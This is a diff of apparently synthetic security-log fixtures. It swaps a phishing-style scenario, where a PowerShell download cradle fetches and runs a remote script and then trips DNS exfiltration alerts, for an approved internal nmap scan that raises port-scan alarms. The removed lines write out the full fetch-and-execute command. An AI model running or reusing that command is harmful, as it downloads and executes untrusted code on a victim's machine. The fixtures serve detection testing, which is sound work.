@@ -1,3 +1,6 @@
-Mar 24 10:30:15 WIN10-8YB72USR CEF:0|Microsoft|PowerShell|10.0|4104|ScriptBlockLogging|7|suser=JDOE@BANK.COM cs1="powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://mediareleaseupdates.com/stage.ps1')"
-Mar 24 10:34:22 WIN10-8YB72USR CEF:0|CrowdStrike|Falcon|1.0|NetworkConnect|DNS Tunnelling Detection|9|src=192.168.1.24 dst=166.88.2.90 dpt=53 proto=UDP cs1="TXT" cs2="mediareleaseupdates.com"
-Mar 24 10:34:30 WIN10-8YB72USR CEF:0|Palo Alto|Firewall|1.0|THREAT|DNS Exfiltration Blocked|9|src=192.168.1.24 dst=166.88.2.90 dpt=53 proto=UDP cs1="mediareleaseupdates.com"
+2026-03-26T11:45:00Z AUDIT: Change Request CR-88392 status changed to 'Approved'. Reason: Internal Vulnerability Scan.
+2026-03-26T12:00:00Z SYSTEM: Process 'nmap' started on IT-ADMIN-01 by admin.kramer.
+2026-03-26T12:00:10Z ALARM: Internal Port Scan detected from 10.0.1.42 to 10.0.2.1:3306 (MySQL).
+2026-03-26T12:00:15Z ALARM: Internal Port Scan detected from 10.0.1.42 to 10.0.2.2:5432 (PostgreSQL).
+2026-03-26T12:00:20Z SYSTEM: High-frequency connection attempts from IT-ADMIN-01 to DB Subnet.
+2026-03-26T12:00:30Z SYSTEM: Correlation rule 'RECON-SCAN' matched. Opening Case CASE-007.
